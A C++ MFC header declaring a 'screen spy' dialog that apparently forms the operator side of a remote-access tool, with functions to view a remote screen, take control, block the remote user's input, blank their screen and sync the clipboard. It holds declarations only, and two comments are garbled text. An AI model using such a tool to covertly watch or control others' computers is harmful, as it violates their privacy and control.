#if !defined(AFX_MyScreenSpyDLG_H__8C27AA31_1C2A_428A_A937_BC00F2519DB1__INCLUDED_)
#define AFX_MyScreenSpyDLG_H__8C27AA31_1C2A_428A_A937_BC00F2519DB1__INCLUDED_

#include "CursorInfo.h"

#pragma once

#include <afxdialogex.h>

// MyScreenSpyDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CMyScreenSpyDlg dialog

class CMyScreenSpyDlg : public CDialogEx
{
	// Construction
public:
	void OnReceiveComplete();
	void OnReceive();
	CMyScreenSpyDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
	// Dialog Data
	//{{AFX_DATA(CMyScreenSpyDlg)
	enum { IDD = IDD_MyScreenSpy };
	// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA

	// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMyScreenSpyDlg)
public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	//}}AFX_VIRTUAL

	// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CMyScreenSpyDlg)
	virtual BOOL OnInitDialog();
	//	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	afx_msg void OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnScreenControl();
	afx_msg void OnScreenSend3();
	afx_msg void OnScreenTraceCursor();
	afx_msg void OnScreenBlockInput();
	afx_msg void OnScreenBlankScreen();
	afx_msg void OnScreenCapture();
	afx_msg void OnScreenSaveDib();
	afx_msg void OnScreenGetClick();
	afx_msg void OnScreenSetClick();
	afx_msg void OnScreenAlgorithmScan();
	afx_msg void OnScreenAlgorithmDiff();
	afx_msg void OnScreenDeep1();
	afx_msg void OnScreenDeep4Gray();
	afx_msg void OnScreenDeep4Color();
	afx_msg void OnScreenDeep8Gray();
	afx_msg void OnScreenDeep8Color();
	afx_msg void OnScreenDeep16();
	afx_msg void OnScreenDeep32();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	HICON m_hIcon;
	void InitMMI();
	MINMAXINFO m_MMI;
	void DrawTipString(CString str);
	HDC m_hDC, m_hMemDC, m_hPaintDC;
	HBITMAP	m_hFullBitmap;
	LPVOID m_lpScreenDIB;
	LPBITMAPINFO m_lpbmi, m_lpbmi_rect;
	UINT m_nCount;
	UINT m_HScrollPos, m_VScrollPos;
	HCURSOR	m_hRemoteCursor;
	DWORD	m_dwCursor_xHotspot, m_dwCursor_yHotspot;
	POINT	m_RemoteCursorPos;
	BYTE	m_bCursorIndex;
	CCursorInfo	m_CursorInfo;
	void ResetScreen();
	void DrawFirstScreen();
	void DrawNextScreenDiff();	// ≤Ó“Ï∑®
	void DrawNextScreenRect();	// ∏Ù––…®√Ë∑®
	void SendResetScreen(int nBitCount);
	void SendResetAlgorithm(UINT nAlgorithm);
	bool SaveSnapshot();
	void UpdateLocalClipboard(char *buf, int len);
	void SendLocalClipboard();
	int	m_nBitCount;
	bool m_bIsFirst;
	bool m_bIsTraceCursor;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	bool m_bIsCtrl;
	void SendNext();
	void SendCommand(MSG* pMsg);
	LRESULT OnGetMiniMaxInfo(WPARAM, LPARAM);
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_MyScreenSpyDLG_H__8C27AA31_1C2A_428A_A937_BC00F2519DB1__INCLUDED_)
